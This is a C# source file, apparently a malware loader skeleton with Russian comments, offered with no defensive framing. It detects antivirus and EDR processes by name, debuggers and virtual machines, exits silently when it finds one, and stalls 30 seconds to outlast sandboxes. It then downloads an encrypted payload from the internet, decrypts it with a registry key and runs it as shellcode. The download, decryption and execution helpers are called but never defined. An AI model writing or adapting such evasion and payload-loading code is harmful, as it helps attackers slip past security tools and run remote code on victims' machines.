using System;
using System.Management;
using System.Diagnostics;

class SmartLoader {
    static bool CheckEnvironment() {
        // Проверяем процессы AV/EDR
        string[] avProcesses = {
            "MsMpEng", "CSFalconService", "CylanceSvc",
            "SentinelAgent", "crowdstrike", "elastic"
        };
        
        foreach (Process p in Process.GetProcesses()) {
            foreach (string av in avProcesses) {
                if (p.ProcessName.ToLower().Contains(av.ToLower())) {
                    return false; // AV найден
                }
            }
        }
        
        // Проверяем наличие отладчика
        if (Debugger.IsAttached) return false;
        
        // Проверяем виртуальную машину
        using (var searcher = new ManagementObjectSearcher(
            "SELECT * FROM Win32_ComputerSystem")) {
            foreach (var item in searcher.Get()) {
                string manufacturer = item["Manufacturer"].ToString().ToLower();
                string model = item["Model"].ToString().ToLower();
                if (manufacturer.Contains("vmware") || 
                    manufacturer.Contains("virtual") ||
                    model.Contains("virtual")) {
                    return false; // VM обнаружена
                }
            }
        }
        
        return true; // Окружение безопасно
    }
    
    static void Main() {
        if (!CheckEnvironment()) {
            Environment.Exit(0); // Тихий выход
        }
        
        // Задержка для обхода песочниц
        DateTime start = DateTime.Now;
        while ((DateTime.Now - start).TotalSeconds < 30) {
            // "тяжелые" вычисления для определения эмуляции
            double result = 0;
            for (int i = 0; i < 1000000; i++) {
                result += Math.Sqrt(i) * Math.Sin(i);
            }
        }
        
        // Если дожили до сюда - загружаем payload
        LoadPayload();
    }
    
    static void LoadPayload() {
        byte[] encrypted = GetPayloadFromInternet();
        byte[] decrypted = Decrypt(encrypted, GetKeyFromRegistry());
        ExecuteShellcode(decrypted);
    }
}
